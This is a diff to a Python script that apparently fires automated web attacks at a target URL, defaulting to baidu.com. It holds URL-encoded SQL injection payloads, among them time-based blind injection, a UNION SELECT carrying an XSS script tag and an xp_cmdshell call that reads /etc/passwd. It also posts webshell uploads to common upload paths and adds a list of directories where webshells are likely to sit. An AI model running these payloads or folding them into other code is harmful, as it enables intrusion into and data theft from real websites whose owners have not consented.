@@ -26,6 +26,7 @@ HADER={
 uppaths={1:'upload.php',2:'upload',3:'?/upload',4:'?mothod=upload',5:'?c=upload'}
 sqlipaths={1:'news.php?id=',2:'?id=',3:'search.php?name=',4:'login.php?name=',5:'?c=edit&m='}
 sqlis={1:'1123%20WAITFOR%20DELAY%20%270%3A0%3A5%27--%20WLTU',2:'1123%20AND%202662%3D3538',3:'1%20and%201=1',4:'3498%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23',5:'1123%29%20AND%205039%3DCAST%28%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285039%3D5039%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%288775%3D8775'}
+shellpaths={1:'images/',2:'upload/',3:'config/',4:'static/',5:'js/'}
 def gen_str(mode=0):
     table = 'abcdefghijklmnopqrstuvwxyz0123456789'
     if(mode==1):
@@ -41,15 +42,15 @@ def webshell_upload(url='http://www.baidu.com/'):
     requests.post(url,data=encode_data[0],headers=dict(HADER,**{'User-Agent':UA[random.randint(1, 4)],'Content-Type':encode_data[1]}))
     print ("webshell_upload")
 def SQLI(url='http://www.baidu.com/'):
-    mode=1
     url+=sqlipaths[random.randint(1, 5)]
     url+=sqlis[random.randint(1, 5)]
     requests.get(url,headers=dict(HADER, **{'User-Agent': UA[random.randint(1, 4)]}))
     print('SQLI')
-def webshell_useing():
+def webshell_useing(url='http://www.baidu.com/'):
     mode=1
-    print('test4')
+    print('webshell_useing')
     r =requests.get('https://www.baidu.com/')
+
 
 def Make():
     switch = {1:webshell_upload, 2:SQLI, 3:webshell_useing}
